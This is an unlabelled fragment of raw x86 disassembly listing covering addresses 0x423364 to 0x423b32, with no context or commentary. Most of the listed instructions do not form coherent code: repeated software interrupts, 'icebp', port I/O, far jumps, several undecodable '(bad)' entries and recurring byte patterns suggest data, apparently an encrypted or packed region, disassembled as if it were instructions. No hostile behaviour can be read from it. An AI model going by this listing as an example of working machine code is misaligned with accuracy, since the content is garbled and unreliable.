  423364:	leave  
  423365:	jbe    0x423304
  423367:	inc    ecx
  423368:	and    DWORD PTR [esi+0x4576cd35],eax
  42336e:	int    0x8d
  423370:	inc    ebp
  423371:	cmp    eax,ebp
  423373:	cmp    ecx,DWORD PTR [edi]
  423375:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42337b:	push   ebx
  42337c:	ror    DWORD PTR [edx],cl
  42337e:	jbe    0x4233d5
  423380:	int    0x76
  423382:	inc    ebp
  423383:	int    0x8d
  423385:	inc    ebp
  423386:	cmp    eax,ebp
  423388:	cmp    ecx,DWORD PTR [edi]
  42338a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423390:	push   ebx
  423391:	ror    DWORD PTR [edx],cl
  423393:	jbe    0x42332a
  423395:	leave  
  423396:	jbe    0x4233d5
  423398:	dec    eax
  423399:	and    DWORD PTR [esi+0x1d76c935],eax
  42339f:	ret    0x8621
  4233a2:	xor    eax,0xcd4576cd
  4233a7:	lea    eax,[ebp+0x3b]
  4233aa:	lds    edi,FWORD PTR [ebx]
  4233ac:	psrlq  mm6,mm2
  4233af:	sub    bl,dl
  4233b1:	mov    ebp,0xcdd35392
  4233b6:	lea    ebp,[ebp+0x52f7d43]
  4233bc:	push   ss
  4233bd:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233c3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233ca:	cmp    eax,0x3b5596cd
  4233cf:	jns    0x42340c
  4233d1:	or     al,0xd3
  4233d3:	lods   eax,DWORD PTR ds:[esi]
  4233d4:	sub    bl,dl
  4233d6:	jmp    0x42336a
  4233d8:	push   ebx
  4233d9:	jge    0x4233a8
  4233db:	jbe    0x42338a
  4233dd:	xor    edx,edx
  4233df:	cmp    ebx,edx
  4233e1:	clc    
  4233e2:	add    cl,BYTE PTR [edx]
  4233e4:	jbe    0x42337b
  4233e6:	int    0x76
  4233e8:	sbb    eax,0x3b1d8dcd
  4233ed:	lds    edi,FWORD PTR [ebx]
  4233ef:	psrlq  mm6,mm2
  4233f2:	sub    bl,dl
  4233f4:	mov    ebp,0xcdd35392
  4233f9:	lea    edx,[ebp+0x16d87d43]
  4233ff:	int    0x76
  423401:	sbb    eax,0x3b1d8dcd
  423406:	lds    edi,FWORD PTR [ebx]
  423408:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42340f:	push   ebx
  423410:	ror    DWORD PTR [edx],cl
  423412:	jbe    0x4233a9
  423414:	int    0x76
  423416:	cmp    eax,0x3b3d8dcd
  42341b:	lds    edi,FWORD PTR [ebx]
  42341d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423424:	push   ebx
  423425:	ror    ebp,cl
  423427:	lea    edx,[ebp+0xad3d12f]
  42342d:	jbe    0x4233c4
  42342f:	int    0x76
  423431:	inc    ebp
  423432:	int    0x8d
  423434:	inc    ebp
  423435:	cmp    eax,ebp
  423437:	cmp    ecx,DWORD PTR [edi]
  423439:	shl    edx,cl
  42343b:	sub    bl,dl
  42343d:	mov    ebp,0xcdd35392
  423442:	lea    edx,[ebp+0x52f7d43]
  423448:	pusha  
  423449:	xchg   edx,eax
  42344a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423451:	or     eax,0x875576cd
  423456:	jbe    0x423428
  423458:	or     ah,dh
  42345a:	xchg   ebp,eax
  42345b:	or     dh,BYTE PTR [esi+0x6d]
  42345e:	pop    ebp
  42345f:	inc    ecx
  423460:	and    DWORD PTR [esi+0x5d760a35],eax
  423466:	leave  
  423467:	jbe    0x42347e
  423469:	cmp    DWORD PTR [ecx],esp
  42346b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423471:	and    DWORD PTR [esi-0xe89f5cb],eax
  423477:	int    0x76
  423479:	xchg   ebp,eax
  42347a:	int    0x8d
  42347c:	xchg   ebp,eax
  42347d:	cmp    eax,ebp
  42347f:	cmp    ecx,DWORD PTR [edi]
  423481:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423487:	push   ebx
  423488:	ror    DWORD PTR [edx],cl
  42348a:	jbe    0x423509
  42348c:	int    0x6d
  42348e:	jmp    0x423496
  423490:	add    DWORD PTR [eax-0x36923280],0x7006
  42349a:	add    BYTE PTR [ebx],cl
  42349c:	and    DWORD PTR [esi-0x369232cb],eax
  4234a2:	push   es
  4234a3:	xchg   esp,eax
  4234a4:	add    BYTE PTR [eax],al
  4234a6:	add    bh,dh
  4234a8:	and    DWORD PTR [esi-0x329232cb],eax
  4234ae:	ins    DWORD PTR es:[edi],dx
  4234af:	int    0x76
  4234b1:	icebp  
  4234b2:	int    0x8d
  4234b4:	icebp  
  4234b5:	cmp    eax,ebp
  4234b7:	cmp    ecx,DWORD PTR [edi]
  4234b9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234bf:	push   ebx
  4234c0:	ror    ebp,cl
  4234c2:	lea    edi,[ebp+0x2f]
  4234c5:	rcl    ebx,1
  4234c7:	int    0x8d
  4234c9:	ins    DWORD PTR es:[edi],dx
  4234ca:	retf   0x8884
  4234cd:	or     DWORD PTR [esi-0x57],esi
  4234d0:	int    0x6d
  4234d2:	int    0x76
  4234d4:	icebp  
  4234d5:	int    0x8d
  4234d7:	icebp  
  4234d8:	cmp    ecx,DWORD PTR [edi]
  4234da:	cmp    eax,ebp
  4234dc:	shl    edx,cl
  4234de:	sub    bl,dl
  4234e0:	mov    ebp,0xcdd35392
  4234e5:	lea    edi,[ebp+0x2f]
  4234e8:	rcl    ebx,1
  4234ea:	int    0x8d
  4234ec:	adc    eax,0x3b1596cd
  4234f1:	or     al,0x3b
  4234f3:	cdq    
  4234f4:	shr    ebx,cl
  4234f6:	xchg   edx,eax
  4234f7:	shr    edx,cl
  4234f9:	sub    BYTE PTR [ebx+0x13],dl
  4234fc:	xchg   ebx,edx
  4234fe:	int    0x8d
  423500:	ins    DWORD PTR es:[edi],dx
  423501:	das    
  423502:	pop    ecx
  423503:	dec    esp
  423504:	mov    ch,cl
  423506:	push   es
  423507:	jo     0x423509
  423509:	add    BYTE PTR [eax],al
  42350b:	int    0x17
  42350d:	jo     0x42350f
  42350f:	add    BYTE PTR [eax],al
  423511:	cmp    eax,ebp
  423513:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423519:	jmp    0x2fd3:0x87d25328
  423520:	pop    ecx
  423521:	lea    ebp,[ecx-0x72f682c5]
  423527:	test   eax,0x76ca6dcd
  42352c:	test   eax,0xcdf18dcd
  423531:	xchg   esi,eax
  423532:	icebp  
  423533:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423536:	cdq    
  423537:	shr    edx,cl
  423539:	sub    bl,dl
  42353b:	jmp    0x4234cf
  42353d:	push   ebx
  42353e:	adc    ecx,ebp
  423540:	xchg   esi,eax
  423541:	jge    0x423572
  423543:	rcl    DWORD PTR [ebx],1
  423545:	int    0x96
  423547:	ins    DWORD PTR es:[edi],dx
  423548:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42354f:	icebp  
  423550:	int    0x8d
  423552:	icebp  
  423553:	cmp    eax,ebp
  423555:	cmp    ecx,DWORD PTR [edi]
  423557:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42355d:	push   ebx
  42355e:	ror    ebp,cl
  423560:	lea    edi,[ebp+0x2f]
  423563:	rcl    ebx,1
  423565:	int    0x8d
  423567:	ins    DWORD PTR es:[edi],dx
  423568:	retf   0x8884
  42356b:	or     DWORD PTR [esi-0x57],esi
  42356e:	int    0x6d
  423570:	int    0x76
  423572:	icebp  
  423573:	int    0x8d
  423575:	icebp  
  423576:	cmp    eax,ebp
  423578:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42357e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423582:	int    0x8d
  423584:	jge    0x4235b5
  423586:	rcl    ebx,1
  423588:	int    0x8d
  42358a:	pop    ebp
  42358b:	int    0x96
  42358d:	pop    ebp
  42358e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423591:	cdq    
  423592:	shr    ebx,cl
  423594:	xchg   edx,eax
  423595:	shr    edx,cl
  423597:	sub    BYTE PTR [ebx+0x13],dl
  42359a:	xchg   ebx,edx
  42359c:	int    0x8d
  42359e:	ins    DWORD PTR es:[edi],dx
  42359f:	das    
  4235a0:	pop    ecx
  4235a1:	dec    esp
  4235a2:	mov    ch,cl
  4235a4:	push   es
  4235a5:	xchg   esp,eax
  4235a6:	add    BYTE PTR [eax],al
  4235a8:	add    ch,cl
  4235aa:	pop    ss
  4235ab:	xchg   esp,eax
  4235ac:	add    BYTE PTR [eax],al
  4235ae:	add    BYTE PTR [ebx],bh
  4235b0:	lds    edi,FWORD PTR [ebx]
  4235b2:	cdq    
  4235b3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235b9:	push   ebx
  4235ba:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235c0:	test   eax,0x8d097d3b
  4235c5:	test   eax,0x76ca6dcd
  4235ca:	test   eax,0xcdf18dcd
  4235cf:	xchg   esi,eax
  4235d0:	icebp  
  4235d1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235d4:	cdq    
  4235d5:	shr    edx,cl
  4235d7:	sub    bl,dl
  4235d9:	jmp    0x42356d
  4235db:	push   ebx
  4235dc:	adc    ecx,ebp
  4235de:	xchg   esi,eax
  4235df:	jge    0x423610
  4235e1:	rcl    DWORD PTR [ebx],1
  4235e3:	int    0x96
  4235e5:	ins    DWORD PTR es:[edi],dx
  4235e6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235ed:	xor    eax,0x3b358dcd
  4235f2:	(bad)  
  4235f4:	(bad)
  4235f7:	sub    bl,dl
  4235f9:	mov    ebp,0xcdd35392
  4235fe:	lea    ebx,[ebp-0x33]
  423601:	xchg   esi,eax
  423602:	pop    ebp
  423603:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423606:	cdq    
  423607:	shr    ebx,cl
  423609:	xchg   edx,eax
  42360a:	shr    edx,cl
  42360c:	sub    BYTE PTR [ebx+0x13],dl
  42360f:	das    
  423610:	rcl    ebx,1
  423612:	xchg   DWORD PTR [esi+0x7d],esi
  423615:	or     dh,BYTE PTR [esi+0x7d]
  423618:	int    0x76
  42361a:	jge    0x4235e9
  42361c:	lea    ecx,ds:0xb2f7d43
  423622:	(bad)  
  423623:	inc    DWORD PTR [eax]
  423625:	add    ch,cl
  423627:	jbe    0x423686
  423629:	int    0x8d
  42362b:	pop    ebp
  42362c:	cmp    ecx,DWORD PTR [edi]
  42362e:	shl    edx,cl
  423630:	sub    BYTE PTR [ebx],bh
  423632:	(bad)
  423635:	xchg   edx,eax
  423636:	push   ebx
  423637:	ror    ebp,cl
  423639:	lea    ecx,ds:0xcdd3d12f
  42363f:	lea    edx,[ebp-0x142cf3c5]
  423645:	xchg   edx,eax
  423646:	push   ebx
  423647:	ror    ebp,cl
  423649:	lea    edx,[ebp-0xd2cf0c5]
  42364f:	sub    BYTE PTR [ebx-0x2d],dl
  423652:	or     dh,BYTE PTR [esi+0x35]
  423655:	int    0x76
  423657:	popf   
  423658:	int    0x8d
  42365a:	popf   
  42365b:	cmp    ecx,DWORD PTR [edi]
  42365d:	shl    edx,cl
  42365f:	sub    BYTE PTR [ebx],bh
  423661:	(bad)
  423664:	xchg   edx,eax
  423665:	push   ebx
  423666:	ror    ebp,cl
  423668:	lea    ebx,[ebp+0x3b9d96cd]
  42366e:	or     al,0xd3
  423670:	jmp    0x423604
  423672:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423678:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42367e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423684:	in     al,dx
  423685:	sbb    al,0xcd
  423687:	jbe    0x423626
  423689:	int    0x8d
  42368b:	popf   
  42368c:	cmp    eax,ebp
  42368e:	cmp    ecx,DWORD PTR [edi]
  423690:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423696:	push   ebx
  423697:	rol    DWORD PTR [edi+0x760a5576],cl
  42369d:	push   ebp
  42369e:	int    0x76
  4236a0:	popf   
  4236a1:	int    0x8d
  4236a3:	popf   
  4236a4:	cmp    eax,ebp
  4236a6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236b0:	int    0x8d
  4236b2:	lods   eax,DWORD PTR ds:[esi]
  4236b3:	xor    edi,DWORD PTR [ebp-0x33]
  4236b6:	jbe    0x423655
  4236b8:	int    0x96
  4236ba:	popf   
  4236bb:	cmp    eax,ebp
  4236bd:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236c3:	mov    ebp,0xcdd25392
  4236c8:	xchg   esi,eax
  4236c9:	push   ebp
  4236ca:	das    
  4236cb:	rcl    edx,1
  4236cd:	inc    ebx
  4236ce:	shr    DWORD PTR [edi],cl
  4236d0:	pop    es
  4236d1:	adc    ebp,edi
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	int    0x76
  4236d7:	stc    
  4236d8:	int    0x76
  4236da:	stc    
  4236db:	int    0x76
  4236dd:	std    
  4236de:	or     dh,BYTE PTR [esi+0x35]
  4236e1:	int    0x76
  4236e3:	mov    ch,cl
  4236e5:	lea    esp,ds:0x3b2596cd
  4236eb:	or     al,0xd3
  4236ed:	jmp    0x423681
  4236ef:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4236f5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4236fc:	jno    0x4236cb
  4236fe:	lea    esp,[ebp-0x33]
  423701:	xchg   esi,eax
  423702:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423706:	cdq    
  423707:	shr    ebx,cl
  423709:	xchg   edx,eax
  42370a:	shr    edx,cl
  42370c:	sub    BYTE PTR [ebx+0x13],dl
  42370f:	jno    0x4236de
  423711:	(bad)  
  423712:	stc    
  423713:	int    0x96
  423715:	stc    
  423716:	add    dh,dl
  423718:	xor    eax,0x993b0c3b
  42371d:	shr    ebx,cl
  42371f:	xchg   edx,eax
  423720:	shr    edx,cl
  423722:	sub    BYTE PTR [ebx+0x13],dl
  423725:	jno    0x423727
  423727:	jo     0x42373d
  423729:	int    0x8d
  42372b:	stc    
  42372c:	int    0x96
  42372e:	stc    
  42372f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423732:	cdq    
  423733:	shr    ebx,cl
  423735:	xchg   edx,eax
  423736:	shr    edx,cl
  423738:	sub    BYTE PTR [ebx+0x13],dl
  42373b:	or     dh,BYTE PTR [esi+0x65]
  42373e:	inc    ebx
  42373f:	jge    0x423770
  423741:	add    eax,0x808080ab
  423746:	int    0x76
  423748:	stc    
  423749:	in     al,dx
  42374a:	(bad)  
  42374b:	int    0x96
  42374d:	or     dh,BYTE PTR gs:[esi-0x53]
  423751:	push   ecx
  423752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423753:	lods   eax,DWORD PTR ds:[esi]
  423754:	int    0x8d
  423756:	lods   eax,DWORD PTR ds:[esi]
  423757:	shr    ebx,cl
  423759:	xchg   edx,eax
  42375a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42375d:	lods   eax,DWORD PTR ds:[esi]
  42375e:	sub    BYTE PTR [ebx-0x2d],dl
  423761:	int    0x8d
  423763:	jne    0x42372f
  423765:	dec    esp
  423766:	or     DWORD PTR [ecx],0x8dcd304c
  42376c:	mov    ch,0xcd
  42376e:	lea    esi,[ebp+0x3bb596cd]
  423774:	or     al,0x3b
  423776:	cdq    
  423777:	shr    edx,cl
  423779:	sub    bl,dl
  42377b:	jmp    0x42370f
  42377d:	push   ebx
  42377e:	adc    ecx,ebp
  423780:	xchg   esi,eax
  423781:	mov    ch,0x87
  423783:	jge    0x423752
  423785:	jbe    0x423734
  423787:	cmp    edx,ebp
  423789:	add    al,0xad
  42378b:	std    
  42378c:	add    al,0xea
  42378e:	std    
  42378f:	shr    ebx,cl
  423791:	sub    BYTE PTR [edi+0x3bd353d2],al
  423797:	leave  
  423798:	int    0x8d
  42379a:	std    
  42379b:	int    0x96
  42379d:	std    
  42379e:	shr    edx,cl
  4237a0:	xchg   edx,eax
  4237a1:	shr    ebx,cl
  4237a3:	sub    BYTE PTR [ebx-0x1d],dl
  4237a6:	cmp    ebx,ecx
  4237a8:	inc    ebx
  4237a9:	rcl    dh,cl
  4237ab:	mov    ds:0xcd8876cd,eax
  4237b0:	lea    ebp,ds:0xcd2d96cd
  4237b6:	add    DWORD PTR [ecx],edx
  4237b8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237c2:	shr    edx,cl
  4237c4:	sub    BYTE PTR [ebx+0x13],dl
  4237c7:	jno    0x423796
  4237c9:	(bad)  
  4237ca:	stc    
  4237cb:	int    0x96
  4237cd:	stc    
  4237ce:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237d1:	cdq    
  4237d2:	shr    ebx,cl
  4237d4:	xchg   edx,eax
  4237d5:	shr    edx,cl
  4237d7:	sub    BYTE PTR [ebx+0x13],dl
  4237da:	jno    0x4237dc
  4237dc:	(bad)  
  4237dd:	jne    0x4237df
  4237df:	jo     0x4237fd
  4237e1:	int    0x76
  4237e3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237e7:	int    0x76
  4237e9:	xor    eax,0xcdfd760a
  4237ee:	jbe    0x4237ed
  4237f0:	cmp    ecx,ebx
  4237f2:	add    al,0xbd
  4237f4:	test   ah,dl
  4237f6:	xor    ecx,ebp
  4237f8:	jbe    0x42386f
  4237fa:	int    0x14
  4237fc:	mov    ch,cl
  4237fe:	jbe    0x423875
  423800:	int    0x84
  423802:	mov    BYTE PTR [ebx],bh
  423804:	jns    0x423841
  423806:	aad    0xd3
  423808:	lods   eax,DWORD PTR ds:[esi]
  423809:	sub    bl,dl
  42380b:	repz xchg edx,eax
  42380d:	push   ebx
  42380e:	ror    ch,cl
  423810:	xchg   esi,eax
  423811:	jne    0x42381d
  423813:	test   BYTE PTR [edx-0x33],cl
  423816:	jbe    0x423815
  423818:	add    al,0xd3
  42381a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423821:	xlat   BYTE PTR ds:[ebx]
  423822:	int    0x76
  423824:	std    
  423825:	cmp    ecx,ebx
  423827:	add    al,0xbd
  423829:	test   ah,dl
  42382b:	xor    ecx,ebp
  42382d:	jbe    0x4238a4
  42382f:	int    0x14
  423831:	mov    ch,cl
  423833:	jbe    0x4238aa
  423835:	int    0x84
  423837:	mov    BYTE PTR [ebx],bh
  423839:	jns    0x423876
  42383b:	aad    0xd3
  42383d:	lods   eax,DWORD PTR ds:[esi]
  42383e:	sub    bl,dl
  423840:	repz xchg edx,eax
  423842:	push   ebx
  423843:	ror    ch,cl
  423845:	xchg   esi,eax
  423846:	jne    0x423852
  423848:	test   BYTE PTR [edx-0x33],cl
  42384b:	jbe    0x42384a
  42384d:	add    al,0xd3
  42384f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423856:	xlat   BYTE PTR ds:[ebx]
  423857:	int    0x76
  423859:	jne    0x423865
  42385b:	jbe    0x42386a
  42385d:	int    0x76
  42385f:	mov    ch,0xcd
  423861:	lea    esi,[ebp+0xf3bc53b]
  423867:	shl    edx,cl
  423869:	sub    bl,dl
  42386b:	mov    ebp,0xcdd35392
  423870:	(bad)  
  423871:	stc    
  423872:	or     dh,BYTE PTR [esi+0x25]
  423875:	leave  
  423876:	jbe    0x423844
  423878:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42387f:	imul   edx,ebp,0x8d0a0c69
  423885:	gs adc bh,dl
  423888:	into   
  423889:	and    DWORD PTR [esi-0x32fad0cb],eax
  42388f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423896:	sar    DWORD PTR [ebx],cl
  423898:	lds    ecx,FWORD PTR [edx]
  42389a:	jbe    0x423849
  42389c:	rol    esi,cl
  42389e:	lods   eax,DWORD PTR ds:[esi]
  42389f:	xchg   edx,eax
  4238a0:	or     dh,BYTE PTR [esi-0x30]
  4238a3:	int    0xd3
  4238a5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238a8:	lods   eax,DWORD PTR ds:[esi]
  4238a9:	sub    BYTE PTR [ebx+0x76],dl
  4238ac:	lods   eax,DWORD PTR ds:[esi]
  4238ad:	retf   0x858c
  4238b0:	int3   
  4238b1:	das    
  4238b2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238bd:	retf   
  4238be:	inc    ebx
  4238bf:	rcl    esi,cl
  4238c1:	jle    0x423890
  4238c3:	jbe    0x42387a
  4238c5:	int    0x8d
  4238c7:	mov    ch,0xcd
  4238c9:	jbe    0x423880
  4238cb:	int    0x96
  4238cd:	mov    ch,0x3b
  4238cf:	jns    0x42390c
  4238d1:	or     al,0xd3
  4238d3:	lods   eax,DWORD PTR ds:[esi]
  4238d4:	sub    bl,dl
  4238d6:	jmp    0x42386a
  4238d8:	push   ebx
  4238d9:	jge    0x4238a8
  4238db:	jbe    0x423942
  4238dd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238e0:	lods   eax,DWORD PTR ds:[esi]
  4238e1:	sub    BYTE PTR [ebx+0x76],dl
  4238e4:	lods   eax,DWORD PTR ds:[esi]
  4238e5:	cmp    edx,ebp
  4238e7:	xchg   DWORD PTR [ebp-0x33],edi
  4238ea:	jbe    0x4238bc
  4238ec:	add    al,0xea
  4238ee:	std    
  4238ef:	add    al,0xad
  4238f1:	std    
  4238f2:	shr    ebx,cl
  4238f4:	sub    BYTE PTR [edi+0x3b1353f1],al
  4238fa:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423901:	and    DWORD PTR [esi-0x323329cb],eax
  423907:	jbe    0x42392e
  423909:	in     al,dx
  42390a:	and    cl,ch
  42390c:	jbe    0x423907
  42390e:	int    0x8d
  423910:	stc    
  423911:	cmp    eax,ebp
  423913:	cmp    ecx,DWORD PTR [edi]
  423915:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42391b:	push   ebx
  42391c:	ror    ebp,cl
  42391e:	(bad)  
  42391f:	stc    
  423920:	int    0x96
  423922:	stc    
  423923:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423926:	cdq    
  423927:	shr    ebx,cl
  423929:	xchg   edx,eax
  42392a:	shr    edx,cl
  42392c:	sub    BYTE PTR [ebx+0x13],dl
  42392f:	inc    ebx
  423930:	jge    0x423961
  423932:	add    eax,0x80809223
  423937:	int    0x76
  423939:	or     eax,0xa886ccd
  42393e:	out    0xb5,al
  423940:	leave  
  423941:	jbe    0x423968
  423943:	mov    dl,0x21
  423945:	xchg   BYTE PTR ds:0x393576c9,dh
  42394b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423951:	dec    ecx
  423952:	mov    al,ds:0x76c93586
  423957:	lods   eax,DWORD PTR ds:[esi]
  423958:	imul   esp,DWORD PTR [ecx],0x76c93586
  42395e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423962:	xor    eax,0xcd3d760a
  423967:	jbe    0x4238f1
  423969:	int    0x8d
  42396b:	lods   eax,DWORD PTR ds:[esi]
  42396c:	int    0x96
  42396e:	lods   eax,DWORD PTR ds:[esi]
  42396f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423972:	jmp    0x423906
  423974:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42397a:	adc    esi,DWORD PTR [ecx-0x33]
  42397d:	lea    edx,[ebp+0x3b9596cd]
  423983:	or     al,0xd3
  423985:	jmp    0x423919
  423987:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42398d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423994:	jno    0x423963
  423996:	lea    esp,[ebp-0x33]
  423999:	xchg   esi,eax
  42399a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  42399e:	cdq    
  42399f:	shr    ebx,cl
  4239a1:	xchg   edx,eax
  4239a2:	shr    edx,cl
  4239a4:	sub    BYTE PTR [ebx+0x13],dl
  4239a7:	jno    0x423976
  4239a9:	lea    esi,[ebp+0x3bb596cd]
  4239af:	or     al,0x3b
  4239b1:	cdq    
  4239b2:	shr    ebx,cl
  4239b4:	xchg   edx,eax
  4239b5:	shr    edx,cl
  4239b7:	sub    BYTE PTR [ebx+0x13],dl
  4239ba:	jno    0x4239bc
  4239bc:	jo     0x4239d2
  4239be:	or     dh,BYTE PTR [esi+0x65]
  4239c1:	int    0x76
  4239c3:	mov    ch,cl
  4239c5:	lea    ebp,[ebp+0x3bad96cd]
  4239cb:	or     al,0xd3
  4239cd:	jmp    0x423961
  4239cf:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239d5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239dc:	jno    0x4239ab
  4239de:	lea    edx,[ebp+0x3b9596cd]
  4239e4:	or     al,0x3b
  4239e6:	cdq    
  4239e7:	shr    ebx,cl
  4239e9:	xchg   edx,eax
  4239ea:	shr    edx,cl
  4239ec:	sub    BYTE PTR [ebx+0x13],dl
  4239ef:	jno    0x4239be
  4239f1:	lea    esi,[ebp+0xb596cd]
  4239f7:	(bad)  
  4239f8:	cmp    eax,0x993b0c3b
  4239fd:	shr    ebx,cl
  4239ff:	xchg   edx,eax
  423a00:	shr    edx,cl
  423a02:	sub    BYTE PTR [ebx+0x13],dl
  423a05:	jno    0x423a07
  423a07:	jo     0x423a1d
  423a09:	int    0x8d
  423a0b:	mov    ch,0xa
  423a0d:	jbe    0x4239bc
  423a0f:	int    0x76
  423a11:	mov    ch,0x3b
  423a13:	or     al,0x3b
  423a15:	jns    0x4239ea
  423a17:	jmp    0x4239ab
  423a19:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a1f:	jbe    0x423a86
  423a21:	inc    ebx
  423a22:	jge    0x423a53
  423a24:	add    eax,0x8080853c
  423a29:	int    0x8d
  423a2b:	mov    ch,0xcd
  423a2d:	xchg   esi,eax
  423a2e:	mov    ch,0x3b
  423a30:	or     al,0x3b
  423a32:	cdq    
  423a33:	shr    ebx,cl
  423a35:	xchg   edx,eax
  423a36:	shr    edx,cl
  423a38:	sub    BYTE PTR [ebx+0x13],dl
  423a3b:	inc    ebx
  423a3c:	lea    ebp,[ebp-0x7ab2fad1]
  423a42:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a49:	and    eax,0x192ebd3
  423a4e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a54:	mov    ch,0xcd
  423a56:	lea    esi,[ebp+0x192ebd3]
  423a5c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a62:	lea    esi,ds:0xd3358dcd
  423a68:	jmp    0x4239fc
  423a6a:	add    DWORD PTR [edx],eax
  423a6c:	scas   eax,DWORD PTR es:[edi]
  423a6d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a71:	aaa    
  423a72:	sbb    al,0x0
  423a74:	add    BYTE PTR [eax],al
  423a76:	add    BYTE PTR [edi+esi*1],0x24
  423a7a:	add    BYTE PTR [eax],al
  423a7c:	add    BYTE PTR [eax+0x24cfcf],al
  423a82:	add    BYTE PTR [eax],al
  423a84:	jno    0x423a86
  423a86:	(bad)  
  423a87:	cmp    eax,0x1ccfcf
  423a8c:	add    BYTE PTR [eax],al
  423a8e:	add    dh,dl
  423a90:	lods   eax,DWORD PTR ds:[esi]
  423a91:	jno    0x423a60
  423a93:	lea    ecx,ds:0xcd4c9100
  423a99:	lea    esi,[ebp+0x4]
  423a9c:	shl    DWORD PTR [eax],cl
  423a9e:	jno    0x423b10
  423aa0:	mov    ebp,0xefef
  423aa5:	or     dh,BYTE PTR [esi-0x30]
  423aa8:	int    0x76
  423aaa:	mov    ch,cl
  423aac:	lea    ebp,ds:0xcd2d96cd
  423ab2:	add    DWORD PTR [ecx],edx
  423ab4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423abe:	shr    edx,cl
  423ac0:	sub    BYTE PTR [ebx+0x13],dl
  423ac3:	jno    0x423a92
  423ac5:	lea    esi,[ebp+0x3bb596cd]
  423acb:	or     al,0x3b
  423acd:	cdq    
  423ace:	shr    ebx,cl
  423ad0:	xchg   edx,eax
  423ad1:	shr    edx,cl
  423ad3:	sub    BYTE PTR [ebx+0x13],dl
  423ad6:	jno    0x423ad8
  423ad8:	(bad)  
  423ad9:	add    BYTE PTR gs:[eax+0x1c],dh
  423add:	int    0x76
  423adf:	rcl    bl,1
  423ae1:	ins    DWORD PTR es:[edi],dx
  423ae2:	xchg   edx,eax
  423ae3:	cmp    ecx,ecx
  423ae5:	inc    ebx
  423ae6:	leave  
  423ae7:	int    0x76
  423ae9:	mov    ch,cl
  423aeb:	lea    ebp,ds:0x811101cd
  423af1:	add    BYTE PTR [eax-0x29d26933],0x54
  423af8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423afb:	cdq    
  423afc:	shr    ebx,cl
  423afe:	xchg   edx,eax
  423aff:	shr    edx,cl
  423b01:	sub    BYTE PTR [ebx+0x13],dl
  423b04:	jno    0x423ad3
  423b06:	lea    esi,[ebp+0x3bb596cd]
  423b0c:	or     al,0x3b
  423b0e:	cdq    
  423b0f:	shr    ebx,cl
  423b11:	xchg   edx,eax
  423b12:	shr    edx,cl
  423b14:	sub    BYTE PTR [ebx+0x13],dl
  423b17:	jno    0x423b19
  423b19:	(bad)  
  423b1a:	jne    0x423b1c
  423b1c:	jo     0x423b3a
  423b1e:	int    0x76
  423b20:	lods   eax,DWORD PTR ds:[esi]
  423b21:	or     dh,BYTE PTR [esi+0x75]
  423b24:	int    0x76
  423b26:	cmp    eax,0xecfd760a
  423b2b:	cmp    BYTE PTR [ebx],bh
  423b2d:	or     al,0x3b
  423b2f:	cdq    
  423b30:	shr    ebx,cl
  423b32:	xchg   edx,eax
